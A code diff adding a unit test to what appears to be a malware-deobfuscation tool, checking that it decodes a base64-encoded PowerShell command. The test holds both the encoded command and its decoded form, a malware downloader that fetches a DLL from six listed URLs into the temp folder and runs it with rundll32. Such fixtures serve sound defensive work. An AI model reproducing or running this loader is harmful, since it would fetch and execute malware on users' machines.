@@ -156,6 +156,20 @@ def test_find_powershell_strings_invoke_expression():
     ]
 
 
+def test_find_powershell_strings_from_dynamic_command():
+    ex = b'"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -encodedcommand "UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAANAA7ACQAUABvAGwAeQBuAG8AbQBpAGEAbABpAHMAdABBAG4AZwBsAGkAYwBpAHoAZQBzACAAPQAgACgAIgBoAHQAdABwAHMAOgAvAC8AZQBkAHMAZQBuAGUAegBhAGwAdQBtAGkAbgB1AG0ALgBjAG8AbQAvAE8AUABHAC8ANABhAFQAOAB2AHcALABoAHQAdABwAHMAOgAvAC8AeQBlAGwAbABvAHcAaABhAHQAZwBsAG8AYgBhAGwALgBjAG8AbQAvAEcAMQBSAFcALwBpAGsAdgBvAHEAbQBpADcASgBzAGwALABoAHQAdABwAHMAOgAvAC8AYQB3AGEAaQBzAGQAYQBuAGkAcwBoAC4AYwBvAG0ALwBOAG4AUgBVAC8AaABwAHQAUwBKAHYALABoAHQAdABwAHMAOgAvAC8AYQB2AGEAaQBsAGEAYgBsAGUAYwBsAGUAYQBuAGUAcgAuAGMAbwBtAC8AdwBoAGcAaQBvAC8ASgBmAHEAeABiAFoAdwBQADEAWQBEACwAaAB0AHQAcABzADoALwAvAGUAbgBnAHYAaQBkAGEALgBjAG8AbQAuAGIAcgAvAHIATABtAC8AYwBmAEsAeQBIAEoAeQB2AGgAMgAsAGgAdAB0AHAAcwA6AC8ALwB1AGIAbQBoAGEAaQB0AGkALgBvAHIAZwAvAHQAaABRADYATAAvAG8ARgBMAE8AZQBqAEoAcgBHACIAKQAuAHMAcABsAGkAdAAoACIALAAiACkAOwBmAG8AcgBlAGEAYwBoACAAKAAkAHQAYQB1AHQAbwBsAG8AZwBpAHoAZQBkACAAaQBuACAAJABQAG8AbAB5AG4AbwBtAGkAYQBsAGkAcwB0AEEAbgBnAGwAaQBjAGkAegBlAHMAKQAgAHsAdAByAHkAIAB7AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgACQAdABhAHUAdABvAGwAbwBnAGkAegBlAGQAIAAtAFQAaQBtAGUAbwB1AHQAUwBlAGMAIAAxADgAIAAtAE8AIAAkAGUAbgB2ADoAVABFAE0AUABcAG0AYQBuAGkAcAB1AGwAYQB0AGkAbwBuAC4AZABsAGwAOwBpAGYAIAAoACgARwBlAHQALQBJAHQAZQBtACAAJABlAG4AdgA6AFQARQBNAFAAXABtAGEAbgBpAHAAdQBsAGEAdABpAG8AbgAuAGQAbABsACkALgBsAGUAbgBnAHQAaAAgAC0AZwBlACAAMQAwADAAMAAwADAAKQAgAHsAcwB0AGEAcgB0ACAAcgB1AG4AZABsAGwAMwAyACAAJABlAG4AdgA6AFQARQBNAFAAXABcAG0AYQBuAGkAcAB1AGwAYQB0AGkAbwBuAC4AZABsAGwALABHAEwANwAwADsAYgByAGUAYQBrADsAfQB9AGMAYQB0AGMAaAAgAHsAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAANAA7AH0AfQA="'
+
+    assert find_powershell_strings(ex) == [
+        Node(
+            type_="shell.powershell",
+            value=b'powershell.exe -Command Start-Sleep -Seconds 4;$PolynomialistAnglicizes = ("https://edsenezaluminum.com/OPG/4aT8vw,https://yellowhatglobal.com/G1RW/ikvoqmi7Jsl,https://awaisdanish.com/NnRU/hptSJv,https://availablecleaner.com/whgio/JfqxbZwP1YD,https://engvida.com.br/rLm/cfKyHJyvh2,https://ubmhaiti.org/thQ6L/oFLOejJrG").split(",");foreach ($tautologized in $PolynomialistAnglicizes) {try {Invoke-WebRequest $tautologized -TimeoutSec 18 -O $env:TEMP\\manipulation.dll;if ((Get-Item $env:TEMP\\manipulation.dll).length -ge 100000) {start rundll32 $env:TEMP\\\\manipulation.dll,GL70;break;}}catch {Start-Sleep -Seconds 4;}}',
+            obfuscation="powershell.base64",
+            start=44,
+            end=1658,
+        ),
+    ]
+
+
 # get_cmd_command
 def test_get_cmd_command_empty():
     assert get_cmd_command(b"") == b""
